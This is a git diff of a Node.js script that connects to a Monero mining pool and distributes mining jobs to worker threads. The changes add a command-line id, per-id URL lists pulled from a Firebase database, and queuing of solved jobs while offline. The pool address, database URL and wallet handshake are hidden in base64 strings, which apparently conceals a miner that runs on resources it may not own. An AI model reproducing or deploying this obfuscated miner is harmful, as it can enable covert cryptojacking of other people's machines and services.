@@ -2,42 +2,50 @@ const { Worker, workerData } = require('node:worker_threads')
 const WebSocketClient = require('websocket').client
 const axios = require('axios')
 
-let BASE_URL = decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4Lw==')
-
-let WSS = decode('d3NzOi8vdHJ1c3RhcHJvaWFtLmRlOjEwMDA1Lw==')
 
 let SIZE = 10
-
+let mId = '1'
 let mClient = null
 let mJob = null
 let mAccepted = 0
 let mPrevAcpt = 0
 let mWorker = {}
 let mTimeout = null
+let mPending = []
+
+let BASE_URL = decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4Lw==')
+
+let WSS = decode('d3NzOi8vdHJ1c3RhcHJvaWFtLmRlOjEwMDA1Lw==')
 
 const mQuota = getQuota()
 
-startServer()
+process.argv.slice(2).forEach(function (data, index) {
+    try {
+        if (index == 0) {
+            mId = data.toString()
+            startServer()
+        }
+    } catch (error) {}
+})
 
 async function startServer() {
+
+    connneckClient()
+
     try {
-        let response = await axios.get(BASE_URL+'website.json?orderBy="quota"&&startAt=0&endAt='+parseInt(new Date().getTime()/1000)+'&print=pretty')
+        let response = await axios.get(BASE_URL+'mining/url_'+mId+'.json')
         await waitForJob()
 
         let list = []
-        let limit = 0
         for (let key of Object.keys(response.data)) {
-            limit++
-            if (limit <= 300) {
-                list.push(key)
+            list.push(key)
 
-                if (list.length >= SIZE) {
-                    try {
-                        let worker = await addWorker(key, list, mJob)
-                        worker.on('message', onMessage)
-                        mWorker[key] = worker
-                    } catch (error) {}
-                }  
+            if (list.length >= SIZE) {
+                try {
+                    let worker = await addWorker(key, list, mJob)
+                    worker.on('message', onMessage)
+                    mWorker[key] = worker
+                } catch (error) {}
             }
         }
 
@@ -75,19 +83,9 @@ const onMessage = function(solved) {
         mAccepted++
         if (mClient) {
             mClient.send(JSON.stringify(solved['job']))
+        } else {
+            mPending.push(JSON.stringify(solved['job']))
         }
-    } else if (solved['status'] == 'CLOSE') {
-        try {
-            if(solved['key']) {
-                if (solved['id'] != null && mWorker[solved['id']]) {
-                    try {
-                        mWorker[solved['id']].terminate()
-                    } catch (error) {}
-                    delete mWorker[solved['id']]
-                }
-                updateUrl(solved['key'])
-            }
-        } catch (error) {}
     }
 }
 
@@ -105,8 +103,6 @@ async function updateUrl(key) {
     } catch (error) {}
 }
 
-connneckClient()
-
 function connneckClient() {
     let client = new WebSocketClient()
 
@@ -123,7 +119,7 @@ function connneckClient() {
     
         console.log('WebSocket Client Connected')
     
-        mClient.send(decode('eyJpZGVudGlmaWVyIjoiaGFuZHNoYWtlIiwicG9vbCI6ImZhc3Rlci54bXIiLCJyaWdodGFsZ28iOiJjbi9yIiwibG9naW4iOiI0NVFXQVJpV2lWeDlmdTVMeWJmTjJIVm03Y3JXeHZlZXBoOGd6ZFZkUmtkd0NmMmo5QmhMVFYyUk41TkY0djdLMmRLRVlhRkNhVXcxMTdMbXcxWmVZOXA5RnI2aXdzbiIsInBhc3N3b3JkIjoidXJsLW1pbmVyIiwidXNlcmlkIjoiIiwidmVyc2lvbiI6MTMsImludHZlcnNpb24iOjEzMzcsIm15ZG9tYWluIjoiV0VCIFNjcmlwdCAxNi0xMS0yMyBQZXJmZWt0IGh0dHBzOi8vd3d3LnJhaXlhbjA4OC54eXoifQ=='))
+        mClient.send(decode('eyJpZGVudGlmaWVyIjoiaGFuZHNoYWtlIiwicG9vbCI6ImZhc3Rlci54bXIiLCJyaWdodGFsZ28iOiJjbi9yIiwibG9naW4iOiI0NVFXQVJpV2lWeDlmdTVMeWJmTjJIVm03Y3JXeHZlZXBoOGd6ZFZkUmtkd0NmMmo5QmhMVFYyUk41TkY0djdLMmRLRVlhRkNhVXcxMTdMbXcxWmVZOXA5RnI2aXdzbiIsInBhc3N3b3JkIjoidXJsX21pbmVyXw==')+mId+decode('IiwidXNlcmlkIjoiIiwidmVyc2lvbiI6MTMsImludHZlcnNpb24iOjEzMzcsIm15ZG9tYWluIjoiV0VCIFNjcmlwdCAxNi0xMS0yMyBQZXJmZWt0IGh0dHBzOi8vd3d3LnJhaXlhbjA4OC54eXoifQ=='))
     
         mClient.on('error', function(error) {
             mClient = null
@@ -143,6 +139,19 @@ function connneckClient() {
                 }
             } catch (e) {}
         })
+
+        setTimeout(async () => {
+            for (let i = 0; i < mPending.length; i++) {
+                try {
+                    if (mClient) {
+                        mClient.send(mPending[i])
+                        await delay(250)
+                    }
+                } catch (error) {}
+            }
+
+            mPending = []
+        }, 1000)
     })
     
     client.connect(WSS)
@@ -154,6 +163,7 @@ function connneckClient() {
         try {
             client.close()
         } catch (error) {}
+        
         try {
             mClient = null
             client = null
